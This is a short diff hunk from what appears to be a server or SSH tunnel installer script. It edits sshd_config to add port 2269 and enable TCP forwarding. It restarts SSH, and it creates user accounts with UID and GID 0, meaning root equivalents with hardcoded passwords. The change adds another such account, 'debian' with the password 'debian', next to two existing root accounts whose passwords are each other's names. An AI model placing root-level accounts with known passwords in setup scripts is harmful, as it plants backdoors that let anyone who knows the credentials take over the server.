@@ -62,6 +62,9 @@ echo "Port 2269" >> /etc/ssh/sshd_config
 sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/g' /etc/ssh/sshd_config
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
 useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
+useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
+
+#ssh service restart
 service ssh restart
 service sshd restart
 
